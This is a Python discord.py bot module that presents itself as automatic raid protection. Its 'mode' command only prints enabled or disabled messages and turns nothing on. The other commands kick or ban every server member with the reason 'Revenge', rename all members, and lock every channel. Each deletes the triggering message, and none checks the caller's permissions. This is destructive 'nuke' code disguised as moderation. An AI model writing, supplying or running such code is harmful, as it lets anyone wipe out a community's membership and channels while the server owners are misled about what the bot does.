from discord.ext import commands
import discord

class auto(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.group(name='auto', invoke_without_command=True)
    async def auto(self, ctx):
        pass
    
    @auto.command(name='mode')
    @commands.cooldown(3, 5, commands.BucketType.guild)
    async def mode(self, ctx, arg1):
        if str(arg1).lower() == "on":
            await ctx.send("**Automatic raid detection has been enabled :green_circle:**")
        elif str(arg1).lower() == "off":
            await ctx.send("**Automatic raid detection has been disabled :red_circle:**")
    
    @auto.command(name='kick')
    @commands.guild_only()
    @commands.bot_has_permissions(kick_members=True)
    @commands.cooldown(3, 10, commands.BucketType.guild)
    async def kick(self, ctx, reason="Revenge"):
        try:
            await ctx.message.delete()
        except:
            pass
        for member in ctx.guild.members:
            try:
                await ctx.guild.kick(member, reason=reason)
            except:
                pass

    @auto.command(name='ban')
    @commands.guild_only()
    @commands.bot_has_permissions(ban_members=True)
    @commands.cooldown(3, 10, commands.BucketType.guild)
    async def ban(self, ctx, reason="Revenge"):
        try:
            await ctx.message.delete()
        except:
            pass
        for member in ctx.guild.members:
            try:
                await ctx.guild.ban(member, reason=reason)
            except:
                pass

    @auto.command(name='nick')
    @commands.guild_only()
    @commands.bot_has_permissions(manage_nicknames=True)
    @commands.cooldown(1, 5, commands.BucketType.guild)
    async def nick(self, ctx, *, nickname):
        try:
            await ctx.message.delete()
        except:
            pass

        if nickname.lower() == "reset" or nickname.lower() == "none":
            nickname = None

        for member in ctx.guild.members:
            try:
                await member.edit(nick=nickname)
            except:
                pass

    @auto.command(name='lockdown', aliases=['lockchannels', 'lock-all', 'lockall'])
    @commands.cooldown(3, 20, commands.BucketType.guild)
    @commands.bot_has_permissions(manage_channels=True)
    @commands.guild_only()
    async def lockdown(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass
        for channel in ctx.guild.channels:
            overwrites_everyone = channel.overwrites_for(ctx.guild.default_role)
            if overwrites_everyone.send_messages == False:
                pass
            else:
                await channel.set_permissions(ctx.guild.default_role, send_messages=False)

    @auto.command(name='unlock', aliases=['unlockchannels', 'unlock-all', 'unlockall'])
    @commands.cooldown(3, 20, commands.BucketType.guild)
    @commands.bot_has_permissions(manage_channels=True)
    @commands.guild_only()
    async def unlock(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass
        for channel in ctx.guild.channels:
            overwrites_everyone = channel.overwrites_for(ctx.guild.default_role)
            if overwrites_everyone.send_messages == None or overwrites_everyone.send_messages == True:
                pass
            else:
                await channel.set_permissions(ctx.guild.default_role, send_messages=True)

    @auto.command(name='role', aliases=['roleall', 'role-all'])
    @commands.cooldown(3, 20, commands.BucketType.guild)
    @commands.bot_has_permissions(manage_roles=True)
    @commands.guild_only()
    async def role(self, ctx, role : discord.Role, reason=None):
        try:
            await ctx.message.delete()
        except:
            pass
        role_get = discord.utils.get(ctx.guild.roles, name=str(role))
        for member in ctx.guild.members:
            await member.add_roles(role_get, reason=reason)

def setup(bot):
    bot.add_cog(auto(bot))